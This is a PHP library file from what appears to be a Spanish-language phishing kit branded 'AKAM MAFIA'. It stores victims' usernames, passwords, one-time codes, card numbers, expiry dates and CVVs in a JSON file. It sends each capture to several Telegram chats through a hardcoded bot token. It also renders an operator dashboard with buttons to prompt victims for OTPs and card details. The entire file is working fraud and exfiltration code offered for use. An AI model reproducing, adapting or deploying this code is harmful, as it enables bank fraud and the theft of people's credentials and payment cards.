<?php
// panel/lib/funciones.php

// ==========================================
// CONFIGURACIÓN CENTRAL AKAM MAFIA
// ==========================================
define('BOT_TOKEN', '8721615356:AAGxIf7AxwGMzhoUOtxI9IRQoOXoIMJ2_iA');
$GLOBALS['chat_ids'] = ["8114050673", "6616662846", "8638340940"];

function enviar_telegram($mensaje) {
    foreach($GLOBALS['chat_ids'] as $id){
        $url = "https://api.telegram.org/bot".BOT_TOKEN."/sendMessage";
        $data = ['chat_id' => $id, 'text' => $mensaje, 'parse_mode' => 'HTML'];
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 5);
        curl_exec($ch);
        curl_close($ch);
    }
}

// ==========================================
// GESTIÓN DE DATOS JSON
// ==========================================
function _data_file_path() {
    $base = __DIR__ . '/../data';
    if (!is_dir($base)) { @mkdir($base, 0777, true); }
    return $base . '/data.json';
}

function _data_load() {
    $file = _data_file_path();
    if (!file_exists($file)) { @file_put_contents($file, json_encode([]), LOCK_EX); }
    return json_decode(@file_get_contents($file), true) ?: [];
}

function _data_save($arr) {
    @file_put_contents(_data_file_path(), json_encode(array_values($arr), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

function _now() {
    date_default_timezone_set('America/Bogota');
    return date("Y-m-d H:i:s");
}

// ==========================================
// FUNCIONES DE BÚSQUEDA Y ESTADO (CONEXIÓN PANEL)
// ==========================================

function traer_regitro($dir){
    $data = _data_load();
    // Buscamos el último registro de esa IP (el más reciente)
    foreach (array_reverse($data) as $it) {
        if (isset($it['ip']) && $it['ip'] === $dir) return $it['idreg'];
    }
    return null;
}

function buscar_estado($reg){
    if($reg == null) return "w"; 
    $data = _data_load();
    foreach ($data as $it) {
        if (strval($it['idreg']) === strval($reg)) {
            return strval($it['status']);
        }
    }
    return "w"; 
}

// ==========================================
// FUNCIONES DE PROCESAMIENTO (CAPTURA)
// ==========================================

function crear_registro($usr, $dis){
    $data = _data_load();
    $id = count($data) + 1;
    $ip = $_SERVER['REMOTE_ADDR'];
    if(empty($usr)) { $usr = "No detectado"; }

    $nuevo = [
        'idreg' => $id, 'usuario' => $usr, 'password' => '', 'otp' => '', 
        'dispositivo' => $dis, 'ip' => $ip, 'status' => 1, 'horamodificado' => _now(),
        'tarjeta' => '', 'ftarjeta' => '', 'cvv' => ''
    ];
    $data[] = $nuevo;
    _data_save($data);

    $msg = "⭐ <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - INICIO</b> ⭐\n\n👤 <b>USUARIO:</b> <code>$usr</code>\n📱 <b>DISP:</b> <code>$dis</code>\n📍 <b>IP:</b> <code>$ip</code>\n\n✅ <b>LOGIN INICIADO</b>";
    enviar_telegram($msg);
    return $id;
}

function actualizar_registro_pass($reg, $pas){
    $data = _data_load();
    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($reg)) {
            $it['password'] = $pas; 
            $it['horamodificado'] = _now();
            $msg = "🔑 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - CLAVE</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n🔑 <b>CLAVE:</b> <code>$pas</code>\n📍 <b>IP:</b> <code>".$it['ip']."</code>";
            enviar_telegram($msg);
            break;
        }
    }
    _data_save($data);
}

function actualizar_registro_tar($reg, $tar, $ft, $cvv){
    $data = _data_load();
    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($reg)) {
            $it['tarjeta'] = $tar; $it['ftarjeta'] = $ft; $it['cvv'] = $cvv;
            $it['horamodificado'] = _now();
            $msg = "💳 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - TARJETA</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n💳 <b>NÚMERO:</b> <code>$tar</code>\n📅 <b>FECHA:</b> <code>$ft</code>\n🔒 <b>CVV:</b> <code>$cvv</code>";
            enviar_telegram($msg);
            break;
        }
    }
    _data_save($data);
}

function actualizar_registro_otp($reg, $cd){
    $data = _data_load();
    foreach ($data as &$it) {
        if (strval($it['idreg']) === strval($reg)) {
            $it['otp'] = $cd; $it['horamodificado'] = _now();
            $msg = "📲 <b>𝓐K𝓐M 𝓜𝓐𝓕𝓘𝓐 - DINÁMICA</b>\n\n👤 <b>USUARIO:</b> <code>".$it['usuario']."</code>\n🔢 <b>CÓDIGO:</b> <code>$cd</code>";
            enviar_telegram($msg);
            break;
        }
    }
    _data_save($data);
}

// ==========================================
// RENDERIZADO DEL DASHBOARD (PANEL)
// ==========================================
function cargar_casos() {
    $data = array_reverse(_data_load());
    foreach ($data as $it) {
        $id = $it['idreg'];
        $color_st = ($it['status'] == "1") ? "green" : "orange";
        
        echo "<div class='item-trans' style='border-left: 5px solid $color_st; margin-bottom:10px; background:#fff; padding:10px;'>
            <table width='100%'>
                <tr>
                    <td><b>ID:</b> $id | <b>User:</b> <code>".$it['usuario']."</code> | <b>IP:</b> ".$it['ip']."</td>
                    <td align='right'><small>".$it['horamodificado']."</small></td>
                </tr>
                <tr>
                    <td colspan='2'>
                        🔑 <b>Pass:</b> <span style='color:red'>".$it['password']."</span> | 
                        📲 <b>OTP:</b> <span style='color:blue'>".$it['otp']."</span><br>
                        💳 <b>Tarj:</b> ".$it['tarjeta']." | 📅 ".$it['ftarjeta']." | 🔒 ".$it['cvv']."
                    </td>
                </tr>
            </table>
            <div style='margin-top:10px;'>
                <button class='dinamica' id='$id'>OTP</button>
                <button class='tarjeta' id='$id'>TARJETA</button>
                <button class='finalizar' id='$id'>FINALIZAR</button>
            </div>
        </div>";
    }
}
?>
